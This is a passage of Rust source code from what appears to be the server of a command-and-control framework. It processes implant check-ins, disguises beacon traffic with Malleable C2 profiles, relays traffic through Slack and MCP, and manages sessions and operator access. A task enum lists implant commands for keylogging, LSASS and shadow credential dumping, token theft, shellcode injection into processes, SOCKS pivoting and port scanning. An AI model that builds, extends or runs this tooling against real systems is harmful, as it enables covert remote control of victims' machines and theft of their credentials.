            // Fan out a COPY of the reply to Slack before shaping/responding.
            // `Bytes::clone` is Arc-backed (cheap; no allocation).
            if let Some(slack) = &st.extc2.slack {
                extc2_relay::relay_reply_to_slack(slack, frame.clone());
            }
            shape_beacon_response(&st, frame)
        }
        Err(e) => {
            tracing::warn!(error = %e, "extc2/slack beacon handler error");
            StatusCode::BAD_REQUEST.into_response()
        }
    }
}

/// External-C2 MCP relay handler. Same shape as [`extc2_relay_handler_slack`]
/// but forwards the reply to the configured MCP server via
/// [`nyx_transport::McpTransport`] (`tools/call`).
async fn extc2_relay_handler_mcp(
    State(st): State<Arc<AppState>>,
    ConnectInfo(peer): ConnectInfo<std::net::SocketAddr>,
    method: Method,
    headers: HeaderMap,
    body: Bytes,
) -> Response {
    match handle_beacon(&st, &peer, &method, &headers, &body) {
        Ok(frame) => {
            if let Some(mcp) = &st.extc2.mcp {
                extc2_relay::relay_reply_to_mcp(mcp, frame.clone());
            }
            shape_beacon_response(&st, frame)
        }
        Err(e) => {
            tracing::warn!(error = %e, "extc2/mcp beacon handler error");
            StatusCode::BAD_REQUEST.into_response()
        }
    }
}

/// Apply the Malleable C2 profile's server-side envelope to the encrypted
/// frame the beacon handler produced. With no profile (or a profile whose
/// `http-post` has no `server { output { } }` block), the envelope is a no-op
/// and the raw frame is returned as before — so this is strictly opt-in.
///
/// The `http-post` transaction is the beacon's task-delivery channel, so its
/// `server.output` transform chain + `header` statements shape the response.
/// Transforming the body makes beacon traffic match the transaction the profile
/// describes (e.g. base64+prepend so the body looks like a JSON field) instead
/// of leaking a raw encrypted frame.
fn shape_beacon_response(st: &AppState, frame: Vec<u8>) -> Response {
    let Some(profile) = &st.profile else {
        return (StatusCode::OK, body_bytes(frame)).into_response();
    };
    let env = nyx_profile::post_server_envelope(profile);
    if env.terminator.is_none() && env.steps.is_empty() && env.headers.is_empty() {
        // No envelope declared — raw frame, legacy behaviour.
        return (StatusCode::OK, body_bytes(frame)).into_response();
    }
    let (body, extra) = env.shape_body(&frame);

    let mut resp = (StatusCode::OK, body_bytes(body)).into_response();

    // Apply profile-declared response headers. CS `header "N" "V"` sets static
    // pairs; when the terminator is a header, the transformed bytes go there too.
    use axum::http::HeaderValue;
    for (name, val) in &env.headers {
        if let (Ok(n), Ok(v)) = (
            axum::http::HeaderName::from_bytes(name),
            HeaderValue::from_bytes(val),
        ) {
            resp.headers_mut().insert(n, v);
        }
    }
    // If the output terminator is a named header, inject the transformed frame
    // bytes there (overriding any static value for that name). For a Parameter
    // terminator the bytes can't ride in a query string on a *response* (the
    // server doesn't control the beacon's request URL), so they go in the body
    // — the agent inverts them from the body. uri-append is request-side only
    // (the beacon appends to its own URL), so on the response path it falls back
    // to the body as well.
    match &env.terminator {
        Some(nyx_profile::Terminator::Header(h)) => {
            if let (Ok(n), Ok(v)) = (
                axum::http::HeaderName::from_bytes(h.as_bytes()),
                HeaderValue::from_bytes(&extra),
            ) {
                resp.headers_mut().insert(n, v);
            } else {
                // The transform output isn't valid header bytes (non-ASCII after
                // a non-base64 chain like mask). Log so the operator sees the
                // profile/transform incompatibility instead of silent frame loss.
                tracing::warn!(
                    header = %h,
                    "profile output terminator 'header' produced non-ASCII bytes \
                     (need base64/hex in the transform chain); response body empty"
                );
            }
        }
        Some(nyx_profile::Terminator::Parameter(_)) | Some(nyx_profile::Terminator::UriAppend) => {
            // The transformed bytes belong in the body for the response path.
            #[allow(clippy::collapsible_match)]
            if !extra.is_empty() {
                resp = (StatusCode::OK, body_bytes(extra)).into_response();
                // Re-apply static headers (the body swap dropped them).
                use axum::http::HeaderValue;
                for (name, val) in &env.headers {
                    if let (Ok(n), Ok(v)) = (
                        axum::http::HeaderName::from_bytes(name),
                        HeaderValue::from_bytes(val),
                    ) {
                        resp.headers_mut().insert(n, v);
                    }
                }
            }
        }
        _ => {}
    }
    resp
}

/// Wrap a Vec<u8> as an axum response body.
fn body_bytes(b: Vec<u8>) -> axum::body::Body {
    axum::body::Body::from(b)
}

/// Constant-time byte comparison to avoid timing oracles on secrets.
///
/// Uses `subtle::ConstantTimeEq` so the comparison time depends only on the
/// input length, not on where (or whether) the buffers differ — important for
/// an operator API token that gates tasking on every beacon. Slice `ct_eq`
/// returns `Choice(0)` (unequal) when the lengths differ, so callers comparing
/// fixed-length tokens are safe; both call sites (`authenticate` legacy token,
/// `operators::verify_secret` plain marker) compare equal-length hex/bearer
/// strings. (HIGH-1: the previous SHA-256-pre-hash variant hashed both inputs
/// first — a needless detour that also widened the secret-material surface.)
pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    use subtle::ConstantTimeEq;
    a.ct_eq(b).unwrap_u8() == 1
}

/// Generate a 32-byte (256-bit) random API token as 64 hex chars (P0-2).
///
/// Used to auto-secure a non-loopback team-server bind that would otherwise be
/// open (no operators, no `NYX_TOKEN`). `OsRng` is the OS CSPRNG (getrandom →
/// BoringSSL/getentropy on macOS, `RtlGenRandom` on Windows); `fill_bytes` is
/// documented infallible on supported targets.
pub fn generate_api_token() -> String {
    use rand::RngCore;
    let mut bytes = [0u8; 32];
    rand::rngs::OsRng.fill_bytes(&mut bytes);
    hex::encode(bytes)
}

/// True if a `host:port` bind string targets a loopback address (P0-2).
///
/// A loopback bind is safe to run without a control-API token; anything else
/// is reachable from the network and MUST carry auth.
///
/// v0.3.0 used string-prefix matching (`starts_with("127.")` etc.) which was
/// bypassable by `localhost.localdomain`, `::1:8443` (bare), `::ffff:127.0.0.1`
/// (v4-mapped), or any hostname `getaddrinfo` resolves to loopback — see HIGH
/// finding in docs/audits/FULL_CODE_AUDIT_2026-07-21.md. The auto-token guard
/// at main.rs:137 depends on this function correctly identifying network
/// binds; a false-positive loopback classification ships an OPEN team server.
///
/// Fix: parse the host out of the `host:port` string and delegate to
/// `IpAddr::is_loopback()` (which correctly handles v4-mapped IPv6, the full
/// `127.0.0.0/8` range, and `::1`). `localhost` (any case, optional trailing
/// dot) is matched literally as a convenience for `getaddrinfo` resolvers.
/// Anything else — including unparseable input — returns `false` (fail-closed,
/// triggering the auto-token generation guard).
pub fn is_loopback_bind(addr: &str) -> bool {
    // Strip the port: last ':' that separates host from port. rsplit_once
    // handles bracketed IPv6 (`[::1]:8443` → host `[::1]`, port `8443`) and
    // bare IPv6 with port (`::1:8443` → ambiguous; the rsplit_once takes the
    // LAST colon, giving host `::1`, port `8443`, which is what we want for
    // the canonical loopback notation).
    let (host, _port) = match addr.rsplit_once(':') {
        Some(hp) => hp,
        None => (addr, ""), // no port — treat the whole string as host
    };
    // Strip IPv6 brackets: `[::1]` → `::1`.
    let host = host
        .strip_prefix('[')
        .and_then(|h| h.strip_suffix(']'))
        .unwrap_or(host);
    // `localhost` (case-insensitive, optional trailing dot — DNS form).
    let lower = host.to_ascii_lowercase();
    if lower == "localhost" || lower == "localhost." {
        return true;
    }
    // Delegate to the standard library's loopback check — covers 127.0.0.0/8,
    // ::1, ::ffff:127.0.0.1 (v4-mapped), and any future loopback range the
    // std lib learns about. Parse failure → not loopback (fail-closed).
    host.parse::<std::net::IpAddr>()
        .map(|ip| ip.is_loopback())
        .unwrap_or(false)
}

/// Truncate `s` to at most `max` chars, marking a cut with a trailing ellipsis
/// (HIGH-3). Bounds the size of operator-supplied command args captured in the
/// audit log so a single task can't bloat `audit.jsonl` unboundedly.
fn truncate(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut t: String = s.chars().take(max).collect();
    t.push('…');
    t
}

fn handle_beacon(
    st: &AppState,
    peer: &std::net::SocketAddr,
    method: &Method,
    headers: &HeaderMap,
    body: &[u8],
) -> anyhow::Result<Vec<u8>> {
    // Kill date: once reached, refuse all beacon traffic so a burned server goes
    // dark (checked per-request, not just at boot, so a long-running server
    // honors it too). Fail CLOSED on a clock error: `unwrap_or(0)` would treat
    // a pre-epoch / skewed clock as now=0, silently *disabling* the kill date
    // (0 < kd always passes) — the opposite of safe for a burn-the-server guard.
    if let Some(kd) = st.killdate {
        let now = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .map(|d| d.as_secs())
            .map_err(|_| {
                anyhow::anyhow!("clock before UNIXEPOCH; kill-date check cannot run safely")
            })?;
        if now >= kd {
            anyhow::bail!("kill date {kd} reached; refusing beacon");
        }
    }
    // Invert the profile's client-side request envelope (if any) before parsing.
    // No profile, or a client block with no transform chain → the body IS the raw
    // frame (identity, zero extra work: parse_frame runs on `body` directly). A
    // transform chain (base64/mask/...) → pull the transformed bytes from the body
    // (print/uri-append/none) or the terminator header, then decode.
    let raw = if let Some(profile) = &st.profile {
        let env = if *method == Method::POST {
            nyx_profile::post_client_envelope(profile)
        } else {
            nyx_profile::get_client_envelope(profile)
        };
        if env.is_noop() {
            // No client block declared → the body IS the raw frame. `is_noop()`
            // is the single source of truth for "nothing to do", so a step-free
            // header/parameter terminator CANNOT accidentally take this fast
            // path and skip locating its bytes (the bug where
            // `client { output { header "Cookie"; } }` dropped every check-in).
            parse_frame(body)?
        } else {
            // Locate the on-wire bytes per the terminator (body for print/none/
            // uri-append, the named header for a header terminator), then invert
            // the transform chain if any.
            let on_wire: &[u8] = match &env.terminator {
                Some(nyx_profile::Terminator::Header(h)) => headers
                    .get(h.as_str())
                    .map(|hv| hv.as_bytes())
                    .ok_or_else(|| {
                        anyhow::anyhow!("client envelope expects request header `{h}`")
                    })?,
                Some(nyx_profile::Terminator::Parameter(p)) => anyhow::bail!(
                    "client envelope parameter terminator `{p}` unsupported on the beacon path"
                ),
                _ => body,
            };
            if env.steps.is_empty() {
                parse_frame(on_wire)?
            } else {
                let decoded = nyx_profile::decode(&env.steps, on_wire)
                    .map_err(|e| anyhow::anyhow!("client envelope decode failed: {e}"))?;
                parse_frame(&decoded)?
            }
        }
    } else {
        parse_frame(body)?
    };

    // Delegate to the channel-agnostic core (spec-1). HTTP envelope inversion
    // happened above; from here on the processing is identical for every channel.
    handle_frame(st, peer, &raw)
}


/// Resolve session key: determine whether this is a new or existing session,
/// and return the derived/stored [`SessionKey`]. For existing sessions, the
/// read-guard counter check is ADVISORY only — the authoritative anti-replay
/// check lives in [`handle_existing_session`] under the write guard.
fn resolve_session_key(
    st: &AppState,
    raw: &nyx_protocol::RawFrame,
) -> anyhow::Result<(bool, SessionKey)> {
    match st.sessions.get(&raw.pubkey) {
        None => Ok((true, st.keypair.derive_for(&raw.pubkey))),
        Some(s) => {
            if raw.counter <= s.last_recv {
                anyhow::bail!("replayed/stale counter {}", raw.counter);
            }
            if s.stale {
                // This session was restored from the persistent store at boot
                // with a zero-placeholder key (the live SessionKey can't be
                // persisted — it's never serialized to disk). Re-derive it now
                // from the server keypair, exactly as the new-session branch
                // does. The write-guard branch below overwrites the stored
                // placeholder with this derived key once the AEAD tag confirms
                // it. This is safe because derive_for is deterministic in the
                // server identity + implant pubkey, so a frame that decrypts
                // under this key is genuine.
                Ok((false, st.keypair.derive_for(&raw.pubkey)))
            } else {
                Ok((false, s.key.clone()))
            }
        }
    }
}

fn handle_new_session(
    st: &AppState,
    peer: &std::net::SocketAddr,
    raw: &nyx_protocol::RawFrame,
    key: SessionKey,
    plaintext: Vec<u8>,
) -> anyhow::Result<Vec<u8>> {
    // First message from an implant is always its SessionInfo (check-in).
    // Cap the global session count: beacon check-in is unauthenticated
    // (anyone who speaks the protocol registers), so without a cap an
    // attacker flooding distinct ephemeral keys OOMs the registry.
    if st.sessions.len() >= MAX_SESSIONS {
        anyhow::bail!("session registry full ({MAX_SESSIONS}); refusing new check-in");
    }
    let mut r = Reader::new(&plaintext);
    let info = SessionInfo::decode(&mut r)?;

    // Validate one-time auth_token if present (per-implant generated implants).
    // Legacy implants (compile-time config, no token) skip this check.
    if let Some(ref token) = info.auth_token {
        let mut hasher = sha2::Sha256::new();
        hasher.update(token);
        let token_hash = hex::encode(hasher.finalize());

        match &st.implants {
            Some(store) => {
                match store.get_by_token_hash(&token_hash) {
                    Ok(Some(rec)) => {
                        // Token valid — mark as consumed. Check the result:
                        // a failure here means the token may still be
                        // replayable, so log at error severity. Do NOT bail
                        // — the session is already validated at this point.
                        if let Err(e) = store.mark_token_used(&rec.implant_pub) {
                            tracing::error!(
                                error = %e,
                                implant_pub = %rec.implant_pub,
                                implant_id = rec.id,
                                "mark_token_used failed; one-time token may be replayable"
                            );
                        }
                        tracing::info!(
                            implant_pub = %rec.implant_pub,
                            implant_id = rec.id,
                            "auth_token validated and consumed"
                        );
                    }
                    Ok(None) => {
                        // Token not found, already used, or revoked.
                        anyhow::bail!(
                            "auth_token rejected: not found, already consumed, or revoked"
                        );
                    }
                    Err(e) => {
                        // Store error — fail CLOSED: a store that can't
                        // validate a presented one-time token must NOT allow
                        // the check-in (the token may be replayed/revoked).
                        tracing::warn!(error = %e, "implant store error during token check; rejecting check-in");
                        anyhow::bail!("auth_token present but cannot validate: store error");
                    }
                }
            }
            None => {
                // No implant store — token was sent but can't be validated.
                // Fail CLOSED: an unvalidatable one-time token must not allow
                // a check-in (the server may simply be misconfigured, but a
                // per-implant-token beacon against a tokenless server is the
                // suspicious case, not the common case).
                tracing::warn!("auth_token present but no implant store; rejecting check-in");
                anyhow::bail!("auth_token present but cannot validate: no store");
            }
        }
    }

    tracing::info!(
        beacon_id = info.beacon_id,
        host = %info.hostname,
        user = %info.username,
        os = %info.os,
        "new session registered"
    );
    let new_event = nyx_scripting::Event::SessionNew(nyx_scripting::SessionNew {
        session_id: hex::encode(raw.pubkey),
        hostname: info.hostname.clone(),
        username: info.username.clone(),
        os: info.os.clone(),
        is_admin: info.is_admin == 1,
    });
    // Pop the inbound TLS fingerprint the sniffer captured for this peer
    // (TLS path). On plaintext (dev) or when sniff failed, both stay None.
    let fp = st
        .fingerprints
        .remove(peer)
        .map(|(_, v)| v)
        .unwrap_or_default();
    // Clone before moving into the Session struct — the reply below still
    // needs &key to seal the empty-task batch. (SessionKey is no longer Copy
    // so it has a real Drop that zeroizes; the clone is zeroized on drop.)
    let reply_key = key.clone();
    // Snapshot the metadata that moves into `Session` so we can persist it
    // AFTER the insert (persistence is fire-and-forget and must never block
    // the beacon path; it runs only for the race-winner, after the shard
    // lock is released).
    let persist_id = hex::encode(raw.pubkey);
    let persist_info = (
        info.beacon_id,
        info.hostname.clone(),
        info.username.clone(),
        info.os.clone(),
        info.arch,
        info.pid,
        info.is_admin,
        info.auth_token,
    );
    let boot_time = now_unix();
    let session = Session {
        key,
        info,
        last_recv: raw.counter,
        send_counter: 0,
        next_task_id: 1,
        pending: Vec::new(),
        results: Vec::new(),
        created: Instant::now(),
        last_seen: Instant::now(),
        ja3: fp.ja3,
        ja4: fp.ja4,
        stale: false,
        persisted_last_touch: Instant::now(),
    };
    // Atomically check-and-insert via `entry()`. This fully closes the
    // TOCTOU that previously existed between `contains_key` and
    // `or_insert_with` (two separate lock acquisitions): two concurrent
    // check-ins carrying the same ephemeral pubkey + counter=0 could BOTH
    // see `contains_key == false`, both proceed into the "newly inserted"
    // branch, and both emit `encode_frame_dir(ServerToClient, 0, ...)` —
    // reusing AEAD nonce 0 under the same session key and breaking the
    // (key, nonce) uniqueness invariant of ChaCha20-Poly1305.
    //
    // `Entry::Vacant` holds the DashMap shard write lock across both the
    // vacancy check AND the insert, so exactly one racer observes Vacant
    // (winner: fires SessionNew, persists, replies S2C:0) while the other
    // observes Occupied (loser: bails with a clean error → 400, no second
    // S2C:0 frame). The loser's next beacon cycle arrives as an existing
    // session. The loser's pre-built `session` is dropped unused (its
    // SessionKey zeroizes on Drop).
    match st.sessions.entry(raw.pubkey) {
        Entry::Vacant(v) => {
            // Winner: insert the session, then fire event + persist + reply.
            // Insert via the vacant entry (not a separate `insert` call) so
            // the shard lock stays held through the whole match arm.
            v.insert(session);
            st.events.fire(&new_event);
            // Persist full session metadata so the registry survives a team-
            // server restart. Fire-and-forget off the hot path: the upsert
            // hands an owned record to the background writer thread, so a
            // slow disk can never block this check-in. Only the race-winner
            // persists (the loser bails below), so there's no double-write.
            if let Some(persist) = &st.sessions_db {
                let (beacon_id, hostname, username, os, arch, pid, is_admin, auth_token) =
                    persist_info;
                persist.upsert(nyx_store::SessionRecord {
                    session_id: persist_id,
                    beacon_id,
                    hostname,
                    username,
                    os,
                    arch,
                    pid,
                    is_admin,
                    first_seen: boot_time,
                    last_seen: boot_time,
                    // SessionInfo.auth_token is [u8;32]; the store keeps a Vec.
                    // By the time this row is written the token has already been
                    // consumed in the `implants` table, so this is forensic, not
                    // auth state.
                    auth_token: auth_token.map(|t| t.to_vec()),
                });
            }
            // No tasks queued yet — reply with an empty batch.
            // Reply sealed in the server→implant nonce space
            // (Direction::ServerToClient) so it never collides with the
            // implant's own Tx nonces under the shared key.
            Ok(encode_frame_dir(
                &raw.pubkey,
                Direction::ServerToClient,
                0,
                &reply_key,
                &Task::encode_vec(&[])?,
            )
            .map_err(|e| anyhow::anyhow!("failed to seal S2C:0 reply: {e}"))?)
        }
        Entry::Occupied(_) => {
            // Lost the check-in race: the other thread already registered the
            // session and will send the S2C:0 reply. Bail so we don't fire a
            // duplicate SessionNew or emit a second S2C:0 frame.
            anyhow::bail!("concurrent check-in race: session already registered");
        }
    }
}

fn handle_existing_session(
    st: &AppState,
    raw: &nyx_protocol::RawFrame,
    key: SessionKey,
    plaintext: Vec<u8>,
) -> anyhow::Result<Vec<u8>> {
    // Subsequent messages carry task responses; we reply with queued tasks.
    //
    // AUTHORITATIVE anti-replay check — INSIDE the write guard. The advisory
    // read-guard check above only saves a decrypt on an obvious stale frame;
    // THIS is where replay protection is actually enforced, because the
    // `counter <= last_recv` test and the `last_recv = counter` commit run
    // under one `get_mut` guard and so cannot be split by a concurrent beacon
    // for the same session. A racing replay that also passed the advisory
    // check loses here: whichever request takes the write guard first
    // advances `last_recv`; the other then sees `counter <= last_recv` and is
    // rejected. (If the session vanished between the get() above and here,
    // return a clean error — never panic.)
    let mut s = st
        .sessions
        .get_mut(&raw.pubkey)
        .ok_or_else(|| anyhow::anyhow!("session vanished mid-request"))?;
    if raw.counter <= s.last_recv {
        anyhow::bail!("replayed/stale counter {}", raw.counter);
    }
    s.last_recv = raw.counter;
    s.last_seen = Instant::now();
    // A live frame clears the boot-stale flag: the session has beaconed
    // since the restart, so it is confirmed alive (no longer just a row
    // restored from the persistent store). A stale session was restored
    // with a zero-placeholder key; now that the re-derived key has
    // successfully decrypted a live frame, persist it into the session so
    // subsequent beacons use the existing-session fast path (clone).
    let was_stale = s.stale;
    s.stale = false;
    if was_stale {
        s.key = key.clone();
    }
    // Throttle the cheap last_seen-only persistence write to at most one
    // per session per PERSIST_TOUCH_THROTTLE. Decided under the write guard
    // so two concurrent beacons for the same session can't both fire a
    // touch; the actual SQLite write runs AFTER the guard is dropped, off
    // the hot path on the persistence background thread.
    let persist_touch = if let Some(persist) = &st.sessions_db {
        let now = Instant::now();
        if now.duration_since(s.persisted_last_touch) >= PERSIST_TOUCH_THROTTLE {
            s.persisted_last_touch = now;
            Some((persist.clone(), hex::encode(raw.pubkey), now_unix()))
        } else {
            None
        }
    } else {
        None
    };
    let responses = TaskResponse::decode_vec(&plaintext)?;
    // Snapshot the scripting-event payloads now (we're about to move
    // `responses` into s.results), then fire them AFTER dropping the guard
    // so a slow operator script (NYX_SCRIPT) can't block this session's
    // DashMap shard.
    let session_id = hex::encode(raw.pubkey);
    let fired: Vec<nyx_scripting::Event> = responses
        .iter()
        .map(|r| {
            let (kind, summary) = response_event_kind(&r.response);
            nyx_scripting::Event::ResultReceived(nyx_scripting::ResultReceived {
                session_id: session_id.clone(),
                task_id: r.task_id,
                kind,
                summary,
            })
        })
        .collect();
    for r in responses {
        s.results.push(r);
        // Bound the results buffer: a rogue/compromised implant streaming
        // Output/FileChunk blobs could otherwise fill RAM forever. Evict
        // oldest (results are best-effort; operators drain them, and an
        // unattended server mustn't OOM on a chatty beacon).
        if s.results.len() > MAX_RESULTS_PER_SESSION {
            let drop_n = s.results.len() - MAX_RESULTS_PER_SESSION;
            s.results.drain(0..drop_n);
        }
    }
    let tasks = std::mem::take(&mut s.pending);
    s.send_counter += 1;
    let counter = s.send_counter;
    drop(s);
    // Fire the throttled last_seen persistence write now that the shard
    // lock is released. Best-effort, non-blocking: if the background thread
    // has exited this is a no-op.
    if let Some((persist, id, ts)) = persist_touch {
        persist.touch(id, ts);
    }
    for ev in fired {
        st.events.fire(&ev);
    }
    let reply = Task::encode_vec(&tasks)?;
    encode_frame_dir(
        &raw.pubkey,
        Direction::ServerToClient,
        counter,
        &key,
        &reply,
    )
    .map_err(|e| anyhow::anyhow!("failed to seal S2C reply: {e}"))
}
/// Channel-agnostic beacon frame handler (spec-1).
///
/// This is the core processing path that ALL channels converge on. HTTP channels
/// (HTTPS/DoH/External C2) extract the raw frame from their HTTP envelope in
/// their handler, then call this. Raw-socket channels (SMB/TCP/DNS) extract the
/// frame from their wire format and call this too.
///
/// `raw_frame` is an already-parsed `RawFrame` (from `parse_frame`) — the caller
/// is responsible for any channel-specific unwrapping before calling this.
fn handle_frame(
    st: &AppState,
    peer: &std::net::SocketAddr,
    raw: &nyx_protocol::RawFrame,
) -> anyhow::Result<Vec<u8>> {
    // Decide new-vs-existing and (for existing) grab the session key. This
    // read-guard counter check is ADVISORY only: it lets us skip the decrypt
    // for an obvious stale replay, but it is NOT the authoritative anti-replay
    // decision — that lives inside the write guard below (existing-session
    // branch), where the check and the `last_recv` commit are atomic. Without
    // that, two concurrent beacons carrying the same counter could both pass
    // this read-guard check before either commits, defeating replay protection.
    // (The server runs under `panic = "abort"`, so we must never panic on a
    // missing/raced session entry — hence the clean error paths, no `.expect()`.)
    let (is_new, key) = resolve_session_key(st, raw)?;

    let plaintext = open_frame(&key, raw).map_err(|_| {
        // The overwhelmingly common cause of a tag mismatch here is key
        // desynchronization: the implant performed ECDH against a server_pub
        // that differs from this server's current long-term identity (stale
        // NYX_SERVER_PUB on the dev agent, or a .nyx_cfg baked against a
        // different/ephemeral keyfile). Because derive_session_key binds
        // server_pub into both the HKDF-Extract salt and the expand info, ANY
        // mismatch fails the AEAD tag deterministically. Log our current
        // identity so the operator can diff it against what the implant was
        // built/launched with — this turns a opaque "decryption failed" into a
        // one-line diagnostic. The claimed pubkey is attacker-controlled beacon
        // input, so only log a truncated prefix (8 hex) for correlation — never
        // the full 64 hex (log-injection / passive-fingerprint surface).
        let our_pub = hex::encode(st.keypair.public_bytes());
        let claimed_short = format!("{:.8}…", hex::encode(&raw.pubkey[..4]));
        tracing::warn!(
            implant_pub_short = %claimed_short,
            this_server_pub = %our_pub,
            "frame decryption failed; if the implant was built/launched with a \
             different server_pub, regenerate it against this_server_pub (or fix \
             NYX_SERVER_PUB) — see scripts/verify_implant_pub.sh"
        );
        anyhow::anyhow!("frame decryption failed")
    })?;

    if is_new {
        handle_new_session(st, peer, raw, key, plaintext)
    } else {
        handle_existing_session(st, raw, key, plaintext)
    }
}

// ---- control API -----------------------------------------------------------
// View types (SessionView, TaskAck, ResultView, TaskView, ProfileView) are
// imported from nyx_rest — the single source of truth for /api/* JSON shapes.

/// If an API token is configured, every control-API request must carry
/// `Authorization: Bearer <token>`. `/beacon` is exempt (implants authenticate
/// cryptographically). Returns `Ok(())` when allowed, else a 401 `Response`.
///
/// Comparison is constant-time to avoid a timing oracle on the operator token
/// (the API token gates tasking on every active beacon — a side-channel leak is
/// a serious operational risk).
fn require_auth(st: &AppState, headers: &HeaderMap) -> Option<Response> {
    // Delegates to `authenticate` so the named-operator registry (Phase 3) gates
    // the read-only handlers identically to the write handlers. `authenticate`
    // encodes the full precedence: registry → legacy token → open.
    match authenticate(st, headers) {
        AuthOutcome::Allowed(_) => None,
        AuthOutcome::Denied(r) => Some(r),
    }
}

/// Phase 3 auth outcome: either a resolved operator identity or a 401 response.
pub(crate) enum AuthOutcome {
    Allowed(operators::OperatorIdentity),
    Denied(Response),
}

/// Resolve a request to a named operator identity (Phase 3). Precedence:
/// (1) a non-empty operator registry → `name:secret` (or bare token → `_legacy`);
/// (2) else the legacy shared `NYX_TOKEN` (constant-time, identity `_legacy`);
/// (3) else open mode (identity `_anonymous`). `require_auth` is retained for
/// the read-only handlers that don't need attribution in v1.
pub(crate) fn authenticate(st: &AppState, headers: &HeaderMap) -> AuthOutcome {
    let bearer_val = headers
        .get(axum::http::header::AUTHORIZATION)
        .and_then(|h| h.to_str().ok())
        .map(|s| s.to_string());
    // (1) Multi-operator registry (loaded from NYX_OPERATORS_FILE / bootstrapped).
    if !st.operators.is_open() {
        let bearer = bearer_val
            .as_deref()
            .and_then(|s| s.strip_prefix("Bearer "));
        return match bearer {
            Some(b) => match st.operators.resolve(b) {
                Some(op) => AuthOutcome::Allowed(op),
                None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
            },
            None => AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response()),
        };
    }
    // (2) Legacy single shared token.
    if let Some(expected) = &st.api_token {
        let want = format!("Bearer {expected}");
        let presented = bearer_val.as_deref().unwrap_or("");
        // Length check BEFORE the constant-time compare: `presented` is
        // attacker-controlled (from the Authorization header) and
        // `subtle::ct_eq` short-circuits on length mismatch, which would
        // leak `want.len()` as a timing oracle. Reject mismatched lengths
        // up front so the comparison only ever runs on equal-length slices.
        if presented.len() != want.len() || !constant_time_eq(want.as_bytes(), presented.as_bytes())
        {
            return AuthOutcome::Denied(StatusCode::UNAUTHORIZED.into_response());
        }
        return AuthOutcome::Allowed(operators::OperatorIdentity {
            name: "_legacy".into(),
            role: operators::Role::Admin,
        });
    }
    // (3) Open (dev/CI) — NO credentials provided at all.
    // Security: map to read-only Viewer, NOT Admin. The original Admin mapping
    // was an RBAC bypass: in open mode any reachable client could POST tasks,
    // read plaintext creds, revoke implants. With Viewer, the existing
    // `if op.role == Role::Viewer { 403 }` guards on every write endpoint
    // close the bypass. For a full-privilege dev/CI session, set
    // NYX_BOOTSTRAP_OPERATOR or NYX_TOKEN.
    tracing::warn!(
        "RBAC open-mode active: anonymous mapped to Viewer (read-only). \
         Set NYX_BOOTSTRAP_OPERATOR or NYX_TOKEN for full-privilege access. \
         Write endpoints (task/creds/generate-implant) will return 403."
    );
    AuthOutcome::Allowed(operators::OperatorIdentity {
        name: "_anonymous".into(),
        role: operators::Role::Viewer,
    })
}

async fn list_sessions(State(st): State<Arc<AppState>>, headers: HeaderMap) -> Response {
    if let Some(r) = require_auth(&st, &headers) {
        return r;
    }
    // Optimization: pre-allocate capacity to prevent reallocation during DashMap iteration.
    let mut out = Vec::with_capacity(st.sessions.len());
    for entry in st.sessions.iter() {
        out.push(SessionView {
            id: hex::encode(entry.key()),
            beacon_id: entry.info.beacon_id,
            hostname: entry.info.hostname.clone(),
            username: entry.info.username.clone(),
            os: entry.info.os.clone(),
            arch: entry.info.arch,
            pid: entry.info.pid,
            is_admin: entry.info.is_admin,
            pending: entry.pending.len(),
            age_secs: entry.created.elapsed().as_secs(),
            ja3: entry.ja3.clone(),
            ja4: entry.ja4.clone(),
            stale: entry.stale,
        });
    }
    Json(out).into_response()
}

#[derive(Deserialize)]
struct TaskReq {
    session: String,
    command: JsonCommand,
}

#[derive(Deserialize)]
#[serde(tag = "type", rename_all = "lowercase")]
enum JsonCommand {
    Ping,
    Shell {
        args: String,
    },
    Sleep {
        seconds: u32,
        jitter_pct: u8,
    },
    /// Write `data_hex` (hex-encoded bytes) to a file named `name` on the target.
    Upload {
        name: String,
        data_hex: String,
    },
    /// Read `path` off the target (streamed back as `FileChunk`s).
    Download {
        path: String,
    },
    /// Execute a BOF/COFF object: `name` (entry label), `args`, `data_hex`
    /// (hex-encoded COFF bytes). Output streams back as a `BofOutput` result.
    Bof {
        name: String,
        args: Vec<String>,
        data_hex: String,
    },
    /// 文件系统操作：op ∈ {cd,mkdir,rm,mv,cp}，dest 仅 mv/cp 需要。
    FileOp {
        op: String,
        path: String,
        dest: Option<String>,
    },
    /// 打开出站连接（P2P / rportfwd）。chan 由 server 分配。
    Connect {
        host: String,
        port: u16,
    },
    /// SOCKS5 中继控制。
    Socks {
        chan: u32,
        op: u8,
        addr: String,
        port: u16,
    },
    /// 截屏。monitor 0=主屏。
    Screenshot {
        monitor: u8,
    },
    /// 端口扫描。
    Portscan {
        host: String,
        ports: String,
    },
    /// 网络信息收集。
    Net {
        query: String,
    },
    /// 磁盘信息。
    Driveinfo,
    /// 剪贴板。
    Clipboard,
    /// 环境变量。name 空串=全部。
    Env {
        name: String,
    },
    /// 键盘记录。action 0=start 1=stop 2=dump。
    Keylog {
        action: u8,
    },
    /// 持续截屏。
    Screenwatch {
        interval_secs: u32,
    },
    /// 凭据哈希提取。method 0=LSASS 1=shadow。
    Hashdump {
        method: u8,
    },
    /// 中继通道写数据（operator→implant 方向）。data_hex 为 hex 编码字节。
    ChannelData {
        chan: u32,
        data_hex: String,
    },
    /// 关闭中继通道（显式拆除；implant 也会在 socket EOF 时自动关）。
    ChannelClose {
        chan: u32,
    },
    /// 令牌窃取：复制 `pid` 的主令牌供后续冒用。横向移动原语。
    StealToken {
        pid: u32,
    },
    /// 造令牌（make-token / pass-the-password）：`domain\user` + `password`。
    /// `logon_type` 1=interactive(默认) 2=network 3=new-credentials。
    MakeToken {
        domain: String,
        user: String,
        password: String,
        logon_type: u8,
    },
    /// 丢弃当前线程冒用（RevertToSelf），但保留持有的令牌供复用。
    Rev2Self,
    /// 查询当前线程身份（DOMAIN\user + 是否持有令牌）。
    GetUid,
    /// 注入 shellcode 到目标进程。method=0 Pool Party(暂走 stomp)/1 threadless/2 stomp。
    Inject {
        method: u8,
        pid: u32,
        spawn_to: String,
        sc_hex: String,
    },
    Trex,
    SetChannel {
        channel: u8,
    },
    Exit,
}

/// Connect channel id 分配器（模块级原子计数器）。
